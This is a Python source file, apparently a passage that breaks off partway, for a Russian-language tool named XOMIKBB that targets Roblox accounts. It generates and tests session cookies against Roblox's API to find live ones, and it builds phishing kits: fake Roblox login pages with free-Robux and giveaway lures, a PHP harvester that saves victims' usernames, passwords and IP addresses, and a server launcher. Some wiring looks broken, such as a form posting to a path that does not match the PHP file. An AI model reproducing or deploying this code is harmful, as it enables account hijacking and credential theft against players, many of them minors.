# XOMIKBB v5.0 - Roblox Cookie Checker | Phishing
# X-GEN | Earth-8847

import sys
import os
import subprocess
import hashlib
import ctypes
import threading
import time
import random
import string
import json
import re
from datetime import datetime

# =================================================================
# ЗАПРОС ПРАВ АДМИНИСТРАТОРА
# =================================================================
def request_admin_rights():
    if sys.platform == "win32":
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit()
        except:
            pass

request_admin_rights()

# =================================================================
# ОПРЕДЕЛЕНИЕ ПУТИ К ПАПКЕ С ФАЙЛОМ
# =================================================================
def get_base_path():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

BASE_PATH = get_base_path()
os.chdir(BASE_PATH)

# =================================================================
# RGB ЦВЕТА ДЛЯ КОНСОЛИ
# =================================================================
class RGB:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    
    @staticmethod
    def rainbow(text):
        colors = [RGB.RED, RGB.YELLOW, RGB.GREEN, RGB.CYAN, RGB.BLUE, RGB.MAGENTA]
        result = ""
        for i, char in enumerate(text):
            result += colors[i % len(colors)] + char
        return result + RGB.END

print(RGB.rainbow("XOMIKBB v5.0 - ЗАГРУЗКА..."))

# =================================================================
# ИМПОРТ МОДУЛЕЙ
# =================================================================
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, font as tkfont
    print(f"{RGB.GREEN}[OK]{RGB.END} Tkinter")
except ImportError as e:
    input(f"Ошибка Tkinter: {e}")
    sys.exit(1)

try:
    import requests
    print(f"{RGB.GREEN}[OK]{RGB.END} Requests")
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests
    print(f"{RGB.GREEN}[OK]{RGB.END} Requests установлен")

print(f"{RGB.GREEN}[OK]{RGB.END} Все модули загружены")

# =================================================================
# КОНСТАНТЫ
# =================================================================
CONFIG_FILE = os.path.join(BASE_PATH, "xomikbb_config.json")
COOKIE_PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"

# ПАПКИ
FOLDERS = {
    "working": os.path.join(BASE_PATH, "xomikbb_working_cookies"),
    "not_working": os.path.join(BASE_PATH, "xomikbb_not_working_cookies"),
    "logs": os.path.join(BASE_PATH, "xomikbb_logs"),
    "generated": os.path.join(BASE_PATH, "xomikbb_generated"),
    "phishing": os.path.join(BASE_PATH, "xomikbb_phishing"),
}

checked_cookies_hash = set()
saved_valid = set()
saved_invalid = set()

# НАСТРОЙКИ ПО УМОЛЧАНИЮ
DEFAULT_CONFIG = {
    "version": "5.0",
    "generate_count": 10,
    "cookie_length": 1500,
    "check_delay": 0.5,
    "timeout": 15,
    "auto_save_valid": True,
    "auto_save_invalid": True,
    "check_duplicates": True,
    "phishing_port": 8080,
    "phishing_template": "free_robux",
    "theme": "dark",
    "font_family": "Consolas",
    "font_size": 10,
    "console_style": "matrix"
}

# ШАБЛОНЫ ФИШИНГА
PHISHING_TEMPLATES = {
    "free_robux": {
        "name": "🎁 Бесплатные Робуксы",
        "description": "Предлагает бесплатные Robux - самый популярный обман",
        "color": "#ffaa00"
    },
    "limited_item": {
        "name": "💎 Лимитированный предмет",
        "description": "Предлагает редкий лимитированный предмет",
        "color": "#aa44ff"
    },
    "verify_account": {
        "name": "🔒 Верификация аккаунта",
        "description": "Просит подтвердить аккаунт для безопасности",
        "color": "#44aaff"
    },
    "giveaway": {
        "name": "🎲 Розыгрыш",
        "description": "Розыгрыш крупного приза",
        "color": "#ff44aa"
    },
    "beta_access": {
        "name": "⚡ Бета доступ",
        "description": "Доступ к новой игре",
        "color": "#44ffaa"
    }
}

# =================================================================
# РАБОТА С КОНФИГОМ
# =================================================================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(cfg, f, indent=4, ensure_ascii=False)
        return True
    except:
        return False

config = load_config()

# =================================================================
# СОЗДАНИЕ ПАПОК
# =================================================================
def create_all_folders():
    for name, folder_path in FOLDERS.items():
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            print(f"[Создана] {folder_path}")
    print(f"\n{RGB.GREEN}[OK]{RGB.END} Все папки созданы в: {BASE_PATH}")

def get_cookie_hash(cookie):
    suffix = cookie[len(COOKIE_PREFIX):] if cookie.startswith(COOKIE_PREFIX) else cookie
    return hashlib.md5(suffix.encode()).hexdigest()

def is_duplicate_cookie(cookie):
    if not config.get("check_duplicates", True):
        return False
    return get_cookie_hash(cookie) in checked_cookies_hash

def mark_cookie_as_checked(cookie):
    checked_cookies_hash.add(get_cookie_hash(cookie))

# =================================================================
# ГЕНЕРАТОР COOKIE
# =================================================================
def random_string(length):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_cookie(length=1500):
    return COOKIE_PREFIX + random_string(length)

def generate_cookies(count, length=1500):
    cookies = []
    for _ in range(count):
        var_length = max(1000, min(2000, length + random.randint(-200, 200)))
        cookies.append(generate_cookie(var_length))
    return cookies

def check_cookie(cookie, timeout=15, log_callback=None):
    try:
        session = requests.Session()
        session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json"
        }
        
        response = session.get("https://www.roblox.com/mobileapi/userinfo", 
                               headers=headers, timeout=timeout)
        
        if response.status_code == 200:
            data = response.json()
            if data and data.get("UserName"):
                return True, {
                    "username": data.get("UserName"),
                    "user_id": data.get("UserID"),
                    "robux": data.get("RobuxBalance", 0),
                    "premium": data.get("IsPremium", False),
                    "cookie": cookie
                }
        return False, {"error": "Invalid cookie"}
    except Exception as e:
        return False, {"error": str(e)}

# =================================================================
# СОХРАНЕНИЕ COOKIE
# =================================================================
def save_valid_cookie(cookie, user_data):
    try:
        username = user_data.get('username', 'unknown')
        user_id = user_data.get('user_id', '0')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = username.replace('/', '_').replace('\\', '_').replace(':', '_')
        filename = os.path.join(FOLDERS["working"], f"{safe_name}_{user_id}_{timestamp}.txt")
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("XOMIKBB v5.0 - WORKING COOKIE\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"COOKIE:\n{cookie}\n\n")
            f.write(f"USERNAME: {username}\n")
            f.write(f"USER ID: {user_id}\n")
            f.write(f"ROBUX: {user_data.get('robux', 0)}\n")
            f.write(f"DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        return filename
    except:
        return None

def save_invalid_cookie(cookie, error_msg=""):
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        cookie_hash = get_cookie_hash(cookie)[:8]
        filename = os.path.join(FOLDERS["not_working"], f"invalid_{cookie_hash}_{timestamp}.txt")
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("XOMIKBB v5.0 - NOT WORKING COOKIE\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"COOKIE:\n{cookie}\n\n")
            f.write(f"ERROR: {error_msg}\n")
            f.write(f"DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        return filename
    except:
        return None

# =================================================================
# ФИШИНГ - УЛУЧШЕННАЯ ВЕРСИЯ
# =================================================================
def generate_phishing_page(template="free_robux", port=8080):
    """Генерирует фишинг страницу Roblox с выбором шаблона"""
    
    phishing_folder = FOLDERS["phishing"]
    
    # Заголовки для разных шаблонов
    templates_data = {
        "free_robux": {
            "title": "Бесплатные Robux - Получи 10000 Robux!",
            "header": "🎁 ПОЛУЧИ 10000 ROBUX БЕСПЛАТНО! 🎁",
            "subheader": "Только сегодня! Введи данные аккаунта и получи Robux",
            "button": "ПОЛУЧИТЬ ROBUX",
            "icon": "🎁"
        },
        "limited_item": {
            "title": "Лимитированный предмет - Dominus Aureus",
            "header": "💎 ТЫ ВЫИГРАЛ ЛИМИТКУ! 💎",
            "subheader": "Забери свой Dominus Aureus, пока не забрали другие!",
            "button": "ЗАБРАТЬ ПРЕДМЕТ",
            "icon": "💎"
        },
        "verify_account": {
            "title": "Подтверждение аккаунта Roblox",
            "header": "🔒 ПОДТВЕРЖДЕНИЕ АККАУНТА 🔒",
            "subheader": "Roblox требует подтверждения для защиты аккаунта",
            "button": "ПОДТВЕРДИТЬ",
            "icon": "🔒"
        },
        "giveaway": {
            "title": "РОЗЫГРЫШ 50000 ROBUX!",
            "header": "🎲 ТЫ УЧАСТВУЕШЬ В РОЗЫГРЫШЕ! 🎲",
            "subheader": "Войди в аккаунт, чтобы подтвердить участие",
            "button": "УЧАСТВОВАТЬ",
            "icon": "🎲"
        },
        "beta_access": {
            "title": "БЕТА ДОСТУП К НОВОЙ ИГРЕ",
            "header": "⚡ ТЕБЕ ДОСТУПЕН БЕТА-ТЕСТ! ⚡",
            "subheader": "Получи эксклюзивный доступ к новой игре",
            "button": "ПОЛУЧИТЬ ДОСТУП",
            "icon": "⚡"
        }
    }
    
    data = templates_data.get(template, templates_data["free_robux"])
    
    # Создаем реалистичную HTML страницу
    html_content = f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{data['title']}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            background: linear-gradient(135deg, #0a0a2e 0%, #1a1a3e 50%, #0a0a2e 100%);
            font-family: 'Arial', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden;
        }}
        
        /* Эффект сетки как на реальном Roblox */
        body::before {{
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 0, 0.05) 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
        }}
        
        /* Анимированные звезды */
        .star {{
            position: fixed;
            background: white;
            border-radius: 50%;
            opacity: 0;
            animation: twinkle 3s infinite;
            pointer-events: none;
        }}
        
        @keyframes twinkle {{
            0%, 100% {{ opacity: 0; transform: scale(0.5); }}
            50% {{ opacity: 1; transform: scale(1); }}
        }}
        
        .login-container {{
            background: rgba(20, 20, 40, 0.95);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            width: 450px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5),
                        0 0 0 1px rgba(0, 255, 0, 0.2);
            border: 1px solid rgba(0, 255, 0, 0.3);
            position: relative;
            z-index: 1;
            transition: transform 0.3s, box-shadow 0.3s;
        }}
        
        .login-container:hover {{
            transform: translateY(-5px);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6),
                        0 0 0 2px rgba(0, 255, 0, 0.4);
        }}
        
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .logo-icon {{
            font-size: 60px;
            animation: bounce 2s infinite;
        }}
        
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-10px); }}
        }}
        
        .logo h1 {{
            background: linear-gradient(135deg, #00ff00, #00aa00);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 32px;
            margin-top: 10px;
            text-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }}
        
        .logo p {{
            color: #888;
            font-size: 14px;
            margin-top: 5px;
        }}
        
        .offer-box {{
            background: linear-gradient(135deg, rgba(0, 255, 0, 0.1), rgba(0, 100, 0, 0.2));
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            margin-bottom: 25px;
            border: 1px solid rgba(0, 255, 0, 0.3);
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.4); }}
            50% {{ box-shadow: 0 0 20px 5px rgba(0, 255, 0, 0.2); }}
        }}
        
        .offer-box h2 {{
            color: #ffaa00;
            font-size: 24px;
            margin-bottom: 5px;
        }}
        
        .offer-box p {{
            color: #ccc;
            font-size: 12px;
        }}
        
        .countdown {{
            font-size: 18px;
            color: #ff4444;
            font-weight: bold;
            margin-top: 10px;
        }}
        
        .input-group {{
            margin: 15px 0;
        }}
        
        .input-group label {{
            display: block;
            color: #aaa;
            margin-bottom: 8px;
            font-size: 14px;
        }}
        
        .input-group input {{
            width: 100%;
            padding: 15px;
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid #333;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }}
        
        .input-group input:focus {{
            outline: none;
            border-color: #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }}
        
        button {{
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #00aa00, #008800);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        button:hover {{
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
            background: linear-gradient(135deg, #00cc00, #00aa00);
        }}
        
        .security-badge {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            padding: 10px;
            border-top: 1px solid #333;
        }}
        
        .security-badge span {{
            color: #555;
            font-size: 12px;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 20px;
            color: #444;
            font-size: 11px;
        }}
        
        .warning-badge {{
            background: rgba(255, 0, 0, 0.1);
            border-radius: 10px;
            padding: 10px;
            margin-top: 15px;
            text-align: center;
        }}
        
        .warning-badge p {{
            color: #ff6666;
            font-size: 11px;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <div class="logo-icon">{data['icon']}</div>
            <h1>ROBLOX</h1>
            <p>{data['subheader']}</p>
        </div>
        
        <div class="offer-box">
            <h2>{data['header']}</h2>
            <p>Осталось мест: <span id="spots">47</span>/50</p>
            <div class="countdown" id="countdown">00:00:00</div>
        </div>
        
        <form method="POST" action="/steal">
            <div class="input-group">
                <label>📧 Имя пользователя</label>
                <input type="text" name="username" placeholder="Введи свой юзернейм" required>
            </div>
            <div class="input-group">
                <label>🔒 Пароль</label>
                <input type="password" name="password" placeholder="Введи свой пароль" required>
            </div>
            <button type="submit">{data['button']}</button>
        </form>
        
        <div class="security-badge">
            <span>🔒 Безопасное соединение</span>
            <span>✓ Roblox официальный партнер</span>
        </div>
        
        <div class="warning-badge">
            <p>⚠️ Никому не передавай свои данные. Roblox никогда не попросит пароль.</p>
        </div>
        
        <div class="footer">
            © 2024 Roblox Corporation. Все права защищены.
        </div>
    </div>
    
    <script>
        // Таймер обратного отсчета
        function startCountdown(minutes) {{
            let timer = minutes * 60;
            const countdownEl = document.getElementById('countdown');
            
            function updateCountdown() {{
                const hours = Math.floor(timer / 3600);
                const mins = Math.floor((timer % 3600) / 60);
                const secs = timer % 60;
                countdownEl.textContent = `${{hours.toString().padStart(2, '0')}}:${{mins.toString().padStart(2, '0')}}:${{secs.toString().padStart(2, '0')}}`;
                
                if (timer > 0) {{
                    timer--;
                    setTimeout(updateCountdown, 1000);
                }}
            }}
            updateCountdown();
        }}
        
        // Уменьшаем количество мест
        let spots = 47;
        const spotsEl = document.getElementById('spots');
        setInterval(() => {{
            if (spots > 0 && Math.random() > 0.7) {{
                spots--;
                spotsEl.textContent = spots;
            }}
        }}, 3000);
        
        // Генерация звезд
        for(let i = 0; i < 100; i++) {{
            const star = document.createElement('div');
            star.className = 'star';
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.width = star.style.height = (Math.random() * 3 + 1) + 'px';
            star.style.animationDelay = Math.random() * 3 + 's';
            document.body.appendChild(star);
        }}
        
        // Запуск таймера на 10 минут
        startCountdown(10);
        
        // Случайное число пользователей онлайн
        const onlineCount = Math.floor(Math.random() * 5000) + 1000;
        document.title = `Roblox - ${{onlineCount}} пользователей онлайн`;
    </script>
</body>
</html>'''
    
    # Сохраняем HTML
    html_file = os.path.join(phishing_folder, "index.html")
    with open(html_file, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    # PHP скрипт для сбора данных
    php_content = '''<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

$data = "=" . str_repeat("=", 78) . "\n";
$data .= "XOMIKBB v5.0 - PHISHING DATA\n";
$data .= "=" . str_repeat("=", 78) . "\n\n";
$data .= "USERNAME: $username\n";
$data .= "PASSWORD: $password\n";
$data .= "IP: $ip\n";
$data .= "USER AGENT: $user_agent\n";
$data .= "REFERER: $referer\n";
$data .= "DATE: $date\n";
$data .= "=" . str_repeat("=", 78) . "\n\n";

$filename = "stolen_data_" . date('Ymd_His') . ".txt";
file_put_contents($filename, $data);

// Редирект на реальный Roblox
header('Location: https://www.roblox.com/login');
exit();
?>'''
    
    php_file = os.path.join(phishing_folder, "steal.php")
    with open(php_file, 'w', encoding='utf-8') as f:
        f.write(php_content)
    
    # BAT файл для запуска сервера
    bat_content = f'''@echo off
title XOMIKBB v5.0 - Phishing Server
color 0a
echo ========================================
echo    XOMIKBB v5.0 - PHISHING SERVER
echo ========================================
echo.
echo [INFO] Server started at: http://localhost:{port}
echo [INFO] HTML file: index.html
echo [INFO] Data will be saved in this folder
echo.
echo [WARNING] Press Ctrl+C to stop server
echo ========================================
echo.
cd "{phishing_folder}"
echo [RUNNING] Starting Python HTTP server on port {port}...
python -m http.server {port}
pause
'''
    
    bat_file = os.path.join(phishing_folder, f"start_server_port_{port}.bat")
    with open(bat_file, 'w', encoding='utf-8') as f:
        f.write(bat_content)
    
    return {
        "html": html_file,
        "php": php_file,
        "bat": bat_file,
        "port": port,
        "url": f"http://localhost:{port}",
        "template": template
    }

# =================================================================
# ГЛАВНОЕ ПРИЛОЖЕНИЕ
# =================================================================
class XOMIKBBApp:
    def __init__(self, root):
        self.root = root
        self.root.title(f"XOMIKBB v5.0 - Roblox Cookie Checker | Phishing")
        self.root.geometry("1400x800")
        self.root.minsize(1200, 700)
        
        # Загрузка настроек
        self.config = load_config()
        
        # Настройки темы
        self.themes = {
            "dark": {"bg": "#1a1a2e", "fg": "#ffffff", "console_bg": "#0d0d1a", "accent": "#00ff00"},
            "light": {"bg": "#f0f0f0", "fg": "#000000", "console_bg": "#ffffff", "accent": "#008800"},
            "matrix": {"bg": "#000000", "fg": "#00ff00", "console_bg": "#0a0a0a", "accent": "#00ff00"},
            "cyber": {"bg": "#0a0a2a", "fg": "#00ffff", "console_bg": "#0a0a2a", "accent": "#00ffff"},
            "blood": {"bg": "#2a0a0a", "fg": "#ff4444", "console_bg": "#1a0a0a", "accent": "#ff0000"}
        }
        
        self.current_theme = self.config.get("theme", "dark")
        self.font_family = self.config.get("font_family", "Consolas")
        self.font_size = self.config.get("font_size", 10)
        
        self.apply_theme()
        
        # Переменные
        self.is_checking = False
        self.stop_flag = False
        
        # Создание папок
        create_all_folders()
        
        # Построение GUI
        self.setup_ui()
        
        self.log_to_console3("XOMIKBB v5.0 запущен", "SUCCESS")
        self.log_to_console3(f"Рабочая папка: {BASE_PATH}", "INFO")
        self.log_to_console3(f"Тема: {self.current_theme}", "INFO")
        
        self.load_settings_to_ui()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def apply_theme(self):
        theme = self.themes.get(self.current_theme, self.themes["dark"])
        self.bg_color = theme["bg"]
        self.fg_color = theme["fg"]
        self.console_bg = theme["console_bg"]
        self.accent_color = theme["accent"]
        self.root.configure(bg=self.bg_color)
    
    def setup_ui(self):
        # Заголовок
        header = tk.Frame(self.root, bg=self.bg_color)
        header.pack(fill=tk.X, pady=10)
        
        # RGB Title
        title_text = "🌈 XOMIKBB v5.0 - ROBLOX COOKIE CHECKER | PHISHING 🌈"
        title = tk.Label(header, text=title_text, 
                         font=("Arial", 16, "bold"), bg=self.bg_color, fg=self.accent_color)
        title.pack()
        
        sub = tk.Label(header, text="Cookie Generator | Checker | Phishing | Anti-Duplicate", 
                       font=("Arial", 10), bg=self.bg_color, fg="#888888")
        sub.pack()
        
        # Вкладки
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Вкладка Чекера
        tab_checker = tk.Frame(notebook, bg=self.bg_color)
        notebook.add(tab_checker, text="🔍 ЧЕКЕР КУКИ")
        self.setup_checker_tab(tab_checker)
        
        # Вкладка Фишинга
        tab_phishing = tk.Frame(notebook, bg=self.bg_color)
        notebook.add(tab_phishing, text="🎣 ФИШИНГ")
        self.setup_phishing_tab(tab_phishing)
        
        # Вкладка Настроек
        tab_settings = tk.Frame(notebook, bg=self.bg_color)
        notebook.add(tab_settings, text="⚙ НАСТРОЙКИ")
        self.setup_settings_tab(tab_settings)
    
    def setup_checker_tab(self, parent):
        # 3 консоли
        consoles_frame = tk.Frame(parent, bg=self.bg_color)
        consoles_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Консоль 1: Результаты
        frame1 = tk.LabelFrame(consoles_frame, text="📊 КОНСОЛЬ 1: WORKING / NOT WORKING", 
                                fg=self.fg_color, bg=self.bg_color, font=(self.font_family, 10, "bold"))
        frame1.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=3)
        
        self.console1 = scrolledtext.ScrolledText(frame1, bg=self.console_bg, fg="#00ff00",
                                                    font=(self.font_family, self.font_size))
        self.console1.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Консоль 2: Cookie
        frame2 = tk.LabelFrame(consoles_frame, text="🔑 КОНСОЛЬ 2: GENERATED COOKIE", 
                                fg=self.fg_color, bg=self.bg_color, font=(self.font_family, 10, "bold"))
        frame2.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=3)
        
        self.console2 = scrolledtext.ScrolledText(frame2, bg=self.console_bg, fg="#ffff00",
                                                    font=(self.font_family, self.font_size-1))
        self.console2.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Консоль 3: Логи
        frame3 = tk.LabelFrame(consoles_frame, text="🐛 КОНСОЛЬ 3: ERRORS / LOGS", 
                                fg="#ff6666", bg=self.bg_color, font=(self.font_family, 10, "bold"))
        frame3.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=3)
        
        self.console3 = scrolledtext.ScrolledText(frame3, bg="#1a0a0a", fg="#ff6666",
                                                    font=(self.font_family, self.font_size-1))
        self.console3.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Прогресс
        self.progress = ttk.Progressbar(parent, length=1300, mode='determinate')
        self.progress.pack(pady=10)
        
        self.status_label = tk.Label(parent, text="Готов к работе", 
                                      bg=self.bg_color, fg="#888888")
        self.status_label.pack()
        
        # Кнопки
        button_frame = tk.Frame(parent, bg=self.bg_color)
        button_frame.pack(pady=10)
        
        self.start_btn = tk.Button(button_frame, text="🚀 СТАРТ", command=self.start_check,
                                    bg="#00aa00", fg="white", font=("Arial", 11, "bold"), padx=20, pady=5)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(button_frame, text="⏹ СТОП", command=self.stop_check,
                                   bg="#aa6600", fg="white", font=("Arial", 11, "bold"), padx=20, pady=5)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        tk.Button(button_frame, text="🗑 ОЧИСТИТЬ", command=self.clear_consoles,
                  bg="#333333", fg="white", font=("Arial", 11, "bold"), padx=20, pady=5).pack(side=tk.LEFT, padx=5)
        
        tk.Button(button_frame, text="🔄 СБРОС ДУБЛИКАТОВ", command=self.reset_duplicates,
                  bg="#884400", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
    
    def setup_phishing_tab(self, parent):
        # Верхняя информационная панель
        info_frame = tk.Frame(parent, bg=self.bg_color)
        info_frame.pack(fill=tk.X, pady=20, padx=20)
        
        tk.Label(info_frame, text="🎣 ФИШИНГ СТРАНИЦА ROBLOX", 
                 font=("Arial", 14, "bold"), bg=self.bg_color, fg="#ff4444").pack()
        
        tk.Label(info_frame, text="Создает реалистичную страницу входа Roblox", 
                 bg=self.bg_color, fg="#888888").pack(pady=5)
        
        # Выбор шаблона
        template_frame = tk.LabelFrame(parent, text="Выбери шаблон фишинга", 
                                        fg=self.fg_color, bg=self.bg_color)
        template_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.template_var = tk.StringVar(value=self.config.get("phishing_template", "free_robux"))
        
        for i, (key, data) in enumerate(PHISHING_TEMPLATES.items()):
            row = i // 3
            col = i % 3
            rb = tk.Radiobutton(template_frame, text=data['name'], 
                                variable=self.template_var, value=key,
                                bg=self.bg_color, fg=data['color'], 
                                selectcolor=self.bg_color, font=("Arial", 10))
            rb.grid(row=row, column=col, padx=20, pady=5, sticky="w")
            
            desc = tk.Label(template_frame, text=data['description'], 
                            bg=self.bg_color, fg="#666666", font=("Arial", 8))
            desc.grid(row=row+1, column=col, padx=20, pady=(0, 10), sticky="w")
        
        # Настройки порта
        port_frame = tk.Frame(parent, bg=self.bg_color)
        port_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(port_frame, text="Порт сервера:", bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT, padx=10)
        self.phishing_port = tk.Spinbox(port_frame, from_=80, to=9999, width=8, 
                                         bg=self.console_bg, fg=self.fg_color)
        self.phishing_port.delete(0, tk.END)
        self.phishing_port.insert(0, str(self.config.get("phishing_port", 8080)))
        self.phishing_port.pack(side=tk.LEFT, padx=10)
        
        # Консоль фишинга
        self.phishing_console = scrolledtext.ScrolledText(parent, bg=self.console_bg, fg="#ffff00",
                                                           font=(self.font_family, self.font_size), height=12)
        self.phishing_console.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Кнопки
        btn_frame = tk.Frame(parent, bg=self.bg_color)
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="🎣 СОЗДАТЬ ФИШИНГ", command=self.create_phishing,
                  bg="#cc0000", fg="white", font=("Arial", 12, "bold"), padx=25, pady=8).pack(side=tk.LEFT, padx=10)
        
        tk.Button(btn_frame, text="🌐 ЗАПУСТИТЬ СЕРВЕР", command=self.start_phishing_server,
                  bg="#0066aa", fg="white", font=("Arial", 10), padx=15, pady=8).pack(side=tk.LEFT, padx=10)
        
        tk.Button(btn_frame, text="📁 ОТКРЫТЬ ПАПКУ", 
                  command=lambda: os.startfile(FOLDERS["phishing"]),
                  bg="#333333", fg="white", font=("Arial", 10), padx=15, pady=8).pack(side=tk.LEFT, padx=10)
        
        # Информация
        info = tk.Label(parent, text=f"📁 Фишинг файлы сохраняются в: {FOLDERS['phishing']}", 
                        bg=self.bg_color, fg="#888888")
        info.pack(pady=10)
    
    def setup_settings_tab(self, parent):
        settings_frame = tk.Frame(parent, bg=self.bg_color)
        settings_frame.pack(fill=tk.BOTH, expand=True, padx=30, pady=20)
        
        # Визуальные настройки
        visual_frame = tk.LabelFrame(settings_frame, text="🎨 ВИЗУАЛЬНЫЕ НАСТРОЙКИ", 
                                      fg=self.fg_color, bg=self.bg_color, font=("Arial", 12, "bold"))
        visual_frame.pack(fill=tk.X, pady=10)
        
        # Выбор темы
        tk.Label(visual_frame, text="Тема:", bg=self.bg_color, fg=self.fg_color).grid(row=0, column=0, padx=10, pady=10, sticky="w")
        self.theme_var = tk.StringVar(value=self.current_theme)
        theme_combo = ttk.Combobox(visual_frame, textvariable=self.theme_var, 
                                    values=list(self.themes.keys()), width=15)
        theme_combo.grid(row=0, column=1, padx=10, pady=10)
        
        # Выбор шрифта
        tk.Label(visual_frame, text="Шрифт:", bg=self.bg_color, fg=self.fg_color).grid(row=1, column=0, padx=10, pady=10, sticky="w")
        self.font_var = tk.StringVar(value=self.font_family)
        fonts = ["Consolas", "Courier New", "Arial", "MS Gothic", "Segoe UI", "Monaco", "Lucida Console"]
        font_combo = ttk.Combobox(visual_frame, textvariable=self.font_var, values=fonts, width=15)
        font_combo.grid(row=1, column=1, padx=10, pady=10)
        
        # Размер шрифта
        tk.Label(visual_frame, text="Размер шрифта:", bg=self.bg_color, fg=self.fg_color).grid(row=2, column=0, padx=10, pady=10, sticky="w")
        self.font_size_var = tk.Spinbox(visual_frame, from_=8, to=20, width=8, bg=self.console_bg, fg=self.fg_color)
        self.font_size_var.delete(0, tk.END)
        self.font_size_var.insert(0, str(self.font_size))
        self.font_size_var.grid(row=2, column=1, padx=10, pady=10)
        
        # Настройки чекера
        checker_frame = tk.LabelFrame(settings_frame, text="⚙ НАСТРОЙКИ ЧЕКЕРА", 
                                       fg=self.fg_color, bg=self.bg_color, font=("Arial", 12, "bold"))
        checker_frame.pack(fill=tk.X, pady=10)
        
        self.check_duplicates_var = tk.BooleanVar(value=self.config.get("check_duplicates", True))
